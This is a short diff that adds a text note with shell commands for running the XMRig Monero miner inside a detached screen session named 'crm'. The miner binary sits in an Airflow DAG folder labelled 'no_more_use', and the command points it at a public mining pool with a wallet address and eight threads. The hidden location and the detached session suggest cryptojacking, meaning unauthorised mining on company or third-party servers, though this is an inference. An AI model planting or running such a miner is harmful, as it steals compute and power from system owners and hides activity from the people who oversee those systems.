@@ -1,1 +1,10 @@
+store at crm
+
+screen -S crm
+/data/airflow_dags/trung/no_more_use/xmrigf/xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u XMR:861YztvzfMYCSez9K4wNn23qh9guNfd6UKEogXWNuYTW8iWEqUPhMPUCouKLtyQd6JEM74MRWuGFRVkLoccEii8z3qz5Gv4.jptnb#jxyb-zqzt -p x -t 8
+
+/* Ctr + A => Detached */
+
+/* reconnect */
+screen -r crm
 
